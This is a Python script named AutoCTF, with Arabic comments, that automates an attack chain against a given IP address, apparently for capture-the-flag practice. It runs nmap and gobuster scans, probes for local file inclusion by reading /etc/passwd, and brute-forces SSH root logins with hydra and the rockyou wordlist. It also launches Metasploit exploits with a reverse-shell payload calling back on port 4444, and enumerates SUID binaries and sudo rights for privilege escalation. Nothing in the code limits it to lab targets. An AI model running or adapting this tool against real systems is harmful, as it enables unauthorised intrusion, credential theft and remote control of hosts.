#!/usr/bin/env python3
# ==========================================
# AutoCTF - البحث عن user.flag و root.flag
# ==========================================

import os
import sys
import time
import subprocess
import re
import json
import datetime
import tempfile

class Colors:
    HEADER = '\033[95m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    GREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    BOLD = '\033[1m'
    ENDC = '\033[0m'

class AutoCTF:
    def __init__(self, target):
        self.target = target
        self.ports = []
        self.services = {}
        self.web_dirs = []
        self.shell = None
        self.user_flag = None
        self.root_flag = None
        self.log = []
    
    def log_step(self, message):
        timestamp = datetime.datetime.now().strftime("%H:%M:%S")
        self.log.append(f"[{timestamp}] {message}")
        print(f"{Colors.CYAN}[*] {message}{Colors.ENDC}")
    
    def run_command(self, cmd):
        self.log_step(f"تنفيذ: {cmd}")
        try:
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=60)
            return result.stdout + result.stderr
        except subprocess.TimeoutExpired:
            return "انتهت المهلة"
        except Exception as e:
            return f"خطأ: {e}"
    
    def nmap_scan(self):
        self.log_step("بدء فحص Nmap")
        output = self.run_command(f"nmap -sC -sV -p- --min-rate=1000 {self.target}")
        for line in output.splitlines():
            m = re.search(r'^(\d+)/tcp\s+open\s+(\S+)', line)
            if m:
                port = m.group(1)
                service = m.group(2)
                self.ports.append(port)
                self.services[port] = service
        self.log_step(f"المنافذ المفتوحة: {self.ports}")
        self.log_step(f"الخدمات: {self.services}")
        return output
    
    def web_enum(self):
        if '80' not in self.services and '443' not in self.services:
            self.log_step("لا توجد خدمة ويب، تخطي تعداد الدلائل")
            return
        port = '80' if '80' in self.services else '443'
        protocol = 'http' if port == '80' else 'https'
        url = f"{protocol}://{self.target}"
        self.log_step(f"بدء تعداد الدلائل على {url}")
        wordlist = "/usr/share/wordlists/dirb/common.txt"
        output = self.run_command(f"gobuster dir -u {url} -w {wordlist} -t 50")
        dirs = re.findall(r'/(\w+)/?\s+\(Status: 200\)', output)
        self.web_dirs = dirs
        self.log_step(f"الدلائل المكتشفة: {self.web_dirs}")
        return output
    
    def check_lfi(self):
        for dir in self.web_dirs:
            if 'index' in dir or 'admin' in dir or 'include' in dir:
                self.log_step(f"محاولة LFI في {dir}")
                test_url = f"http://{self.target}/{dir}/?page=../../../../etc/passwd"
                out = self.run_command(f"curl -s {test_url}")
                if "root:" in out:
                    self.log_step(f"وجدنا LFI في {test_url}")
                    return test_url
        return None
    
    def check_upload(self):
        for dir in self.web_dirs:
            if 'upload' in dir:
                self.log_step(f"محاولة استغلال رفع ملفات في {dir}")
                return f"http://{self.target}/{dir}"
        return None
    
    def exploit_web(self):
        lfi = self.check_lfi()
        if lfi:
            # يمكن قراءة ملفات العلم عبر LFI
            self.log_step("محاولة قراءة user.flag عبر LFI")
            user_flag_url = f"{lfi}&file=../../../home/user/user.flag"  # افتراض المسار
            out = self.run_command(f"curl -s {user_flag_url}")
            if out and "flag" in out:
                self.user_flag = out.strip()
                self.log_step(f"وجدنا user.flag: {self.user_flag}")
            
            root_flag_url = f"{lfi}&file=../../../root/root.flag"
            out = self.run_command(f"curl -s {root_flag_url}")
            if out and "flag" in out:
                self.root_flag = out.strip()
                self.log_step(f"وجدنا root.flag: {self.root_flag}")
        upload = self.check_upload()
        if upload:
            self.log_step("صفحة رفع ملفات موجودة، يمكن محاولة رفع شيل")
            # يمكن إضافة كود لرفع شيل آلياً
    
    def search_exploit(self, service, version=""):
        self.log_step(f"البحث عن استغلال لـ {service} {version}")
        output = self.run_command(f"searchsploit {service} {version}")
        lines = output.splitlines()
        exploits = []
        for line in lines:
            if 'exploits/' in line:
                parts = line.split('|')
                if len(parts) >= 2:
                    exploits.append(parts[1].strip())
        if exploits:
            self.log_step(f"وجدنا استغلالات: {exploits[0]}")
            return exploits[0]
        else:
            return None
    
    def try_exploit(self, exploit_name, port):
        self.log_step(f"محاولة تشغيل الاستغلال {exploit_name} على المنفذ {port}")
        rc_file = tempfile.NamedTemporaryFile(mode='w', suffix='.rc', delete=False)
        rc_file.write(f"use {exploit_name}\n")
        rc_file.write(f"set RHOSTS {self.target}\n")
        rc_file.write(f"set RPORT {port}\n")
        rc_file.write("set PAYLOAD generic/shell_reverse_tcp\n")
        rc_file.write("set LHOST tun0\n")  # يجب تغييرها حسب الواجهة
        rc_file.write("set LPORT 4444\n")
        rc_file.write("exploit -j\n")
        rc_file.close()
        output = self.run_command(f"msfconsole -q -r {rc_file.name}")
        os.unlink(rc_file.name)
        if "Meterpreter session" in output or "Command shell session" in output:
            self.log_step("الاستغلال نجح!")
            return True
        return False
    
    def brute_force_ssh(self):
        if '22' not in self.services:
            return False
        self.log_step("بدء هجوم قاموس على SSH")
        wordlist = "/usr/share/wordlists/rockyou.txt"
        output = self.run_command(f"hydra -l root -P {wordlist} ssh://{self.target} -t 4 -o hydra_result.txt")
        with open('hydra_result.txt') as f:
            data = f.read()
        m = re.search(r'login:\s+(\S+)\s+password:\s+(\S+)', data)
        if m:
            user, pwd = m.groups()
            self.log_step(f"وجدنا بيانات: {user}:{pwd}")
            return (user, pwd)
        return None
    
    def get_shell_via_ssh(self, creds):
        user, pwd = creds
        self.log_step("محاولة الاتصال عبر SSH")
        cmd = f"sshpass -p '{pwd}' ssh -o StrictHostKeyChecking=no {user}@{self.target} 'whoami'"
        output = self.run_command(cmd)
        if user in output:
            self.log_step("اتصال SSH ناجح")
            self.shell = f"ssh {user}@{self.target}"
            return True
        return False
    
    def privesc_linux(self):
        self.log_step("بدء رفع الصلاحيات على لينكس")
        commands = [
            "whoami",
            "id",
            "uname -a",
            "sudo -l",
            "find / -perm -4000 -type f 2>/dev/null",
            "cat /etc/passwd",
            "crontab -l",
            "ls -la /home",
            "ls -la /root"
        ]
        for cmd in commands:
            if self.shell:
                full_cmd = f"ssh {self.shell.split()[-1]} '{cmd}'"
                out = self.run_command(full_cmd)
                self.log_step(f"نتيجة {cmd}:\n{out[:200]}")
                if 'sudo' in out and 'NOPASSWD' in out:
                    self.log_step("يمكن استغلال sudo")
                if '4000' in out:
                    self.log_step("لدينا SUID binaries، تحقق من GTFOBins")
        
        # محاولة استغلال شائع
        self.log_step("محاولة استغلال sudoedit (CVE-2021-3156) إذا كان متاحاً")
        # يمكن تنزيل وتنفيذ استغلال
    
    def search_flags(self):
        self.log_step("البحث عن user.flag و root.flag")
        locations = {
            "user": [
                "/home/*/user.flag",
                "/home/*/user.txt",
                "/home/*/flag.txt",
                "/home/*/flag",
                "/var/www/user.flag",
                "/tmp/user.flag"
            ],
            "root": [
                "/root/root.flag",
                "/root/root.txt",
                "/root/flag.txt",
                "/root/flag",
                "/root/.flag"
            ]
        }
        
        if self.shell:
            ssh_cmd = f"ssh {self.shell.split()[-1]}"
            # البحث عن علم المستخدم
            for loc in locations["user"]:
                out = self.run_command(f"{ssh_cmd} 'cat {loc}' 2>/dev/null")
                if out and not "No such file" in out and len(out.strip()) > 0:
                    self.user_flag = out.strip()
                    self.log_step(f"وجدنا user.flag في {loc}: {self.user_flag}")
                    break
            
            # البحث عن علم الجذر
            for loc in locations["root"]:
                out = self.run_command(f"{ssh_cmd} 'cat {loc}' 2>/dev/null")
                if out and not "No such file" in out and len(out.strip()) > 0:
                    self.root_flag = out.strip()
                    self.log_step(f"وجدنا root.flag في {loc}: {self.root_flag}")
                    break
        else:
            self.log_step("لا يوجد شيل، تخطي البحث عن الأعلام")
    
    def run(self):
        self.log_step("بدء الهجوم التلقائي على " + self.target)
        
        # 1. فحص Nmap
        self.nmap_scan()
        
        # 2. إذا كان ويب، تعداد دلائل واستغلال
        if '80' in self.services or '443' in self.services:
            self.web_enum()
            self.exploit_web()
        
        # 3. محاولة استغلال الخدمات الأخرى
        for port, service in self.services.items():
            if service == 'ssh':
                creds = self.brute_force_ssh()
                if creds:
                    if self.get_shell_via_ssh(creds):
                        break
                else:
                    exploit = self.search_exploit('openssh')
                    if exploit:
                        if self.try_exploit(exploit, port):
                            break
            elif service in ['ftp', 'smb']:
                # محاولة anonymous
                pass
            elif service in ['http', 'https']:
                continue
            else:
                exploit = self.search_exploit(service)
                if exploit:
                    self.try_exploit(exploit, port)
        
        # 4. إذا حصلنا على شيل، نبدأ رفع الصلاحيات والبحث عن الأعلام
        if self.shell:
            self.privesc_linux()
            self.search_flags()
        else:
            self.log_step("لم نتمكن من الحصول على شيل.")
        
        # 5. عرض النتائج
        print(f"\n{Colors.GREEN}{Colors.BOLD}=== النتائج النهائية ==={Colors.ENDC}")
        if self.user_flag:
            print(f"{Colors.BOLD}user.flag: {self.user_flag}{Colors.ENDC}")
        else:
            print("لم نعثر على user.flag.")
        
        if self.root_flag:
            print(f"{Colors.BOLD}root.flag: {self.root_flag}{Colors.ENDC}")
        else:
            print("لم نعثر على root.flag.")
        
        # حفظ السجل
        with open("autoctf_log.txt", "w") as f:
            f.write("\n".join(self.log))
        print(f"{Colors.CYAN}تم حفظ السجل في autoctf_log.txt{Colors.ENDC}")

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("استخدام: python3 autoctf.py <target_ip>")
        sys.exit(1)
    target = sys.argv[1]
    agent = AutoCTF(target)
    agent.run()
